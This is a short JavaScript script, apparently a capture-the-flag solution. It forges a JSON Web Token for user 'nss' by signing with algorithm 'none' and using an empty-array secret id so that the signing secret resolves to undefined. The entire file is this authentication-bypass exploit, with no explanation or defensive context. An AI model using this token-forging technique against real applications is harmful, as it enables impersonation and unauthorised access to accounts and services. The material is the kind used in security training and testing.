const jwt = require('jsonwebtoken')
global.secrets = [];

var user = {"secretid":[],"username":"nss","password":"123456","iat":1798377568};
const secret = global.secrets[user.secretid];
var token = jwt.sign(user, secret, {algorithm: 'none'});
console.log(token);
